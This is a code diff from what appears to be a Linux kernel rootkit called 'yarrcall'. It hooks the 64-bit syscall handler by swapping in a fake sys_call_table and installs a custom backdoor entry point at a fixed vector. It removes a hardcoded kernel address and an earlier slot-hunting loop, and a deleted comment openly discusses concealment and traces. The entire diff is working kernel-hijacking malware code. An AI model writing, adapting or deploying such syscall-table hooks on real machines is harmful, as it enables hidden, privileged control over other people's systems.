@@ -11,10 +11,6 @@
 #include "patch.h"
 #include "yarrcall.h"
 
-// TODO: Lookup for sys_ni_syscall.
-unsigned long sys_ni_syscall = 0xffffffff920bf2d0;
-//unsigned long sys_ni_syscall = 0xffffffff8b6bf2d0;
-
 // Our fake sys_call_table.
 unsigned long __fake_sct[__NR_syscall_max+1];
 
@@ -26,7 +22,7 @@ unsigned long __fake_sct[__NR_syscall_max+1];
  */
 int __hook_syscall_table_64(void) {
     unsigned char *entry_SYSCALL_64, *do_syscall_64, *addr_e8, *addr_8b;
-    int displacement, sct_addr_encoded, i, err, yarrcall_installed;
+    int displacement, sct_addr_encoded, i, err;
     unsigned long addr, *sys_call_table;
     int32_t fake_sct_addr;
 
@@ -81,24 +77,13 @@ int __hook_syscall_table_64(void) {
     // pointer so we omit a warning.
     sys_call_table = (void *)(long)sct_addr_encoded;
 
-    // Fulfill our fake sys_call_table with the real syscalls. Additionally
-    // when we find an entry with sys_ni_syscall (not-implemented syscall)
-    // install there entry_yarrcall().
-    yarrcall_installed = 0;
+    // Fulfill our fake sys_call_table with the real syscalls.
     for (i = 0; i < __NR_syscall_max + 1; i++) {
-        if (!yarrcall_installed && sys_call_table[i] == sys_ni_syscall) {
-            __fake_sct[i] = (unsigned long)entry_yarrcall;
-
-            // TODO: This is a sign we leave and that can be traced, I
-            // shouldn't do this for the sake of concealment, but I'm
-            // programming this thing for me and to learn, so I don't
-            // care.
-            yarrcall_installed = 0x01ec0ded;
-            continue;
-        }
-
         __fake_sct[i] = sys_call_table[i];
     }
+
+    // Install our entry point.
+    __fake_sct[YARR_VECTOR] = (unsigned long)entry_yarrcall;
 
     // Now we patch the instruction from where we got the sys_call_table
     // with our fake sys_call_table.
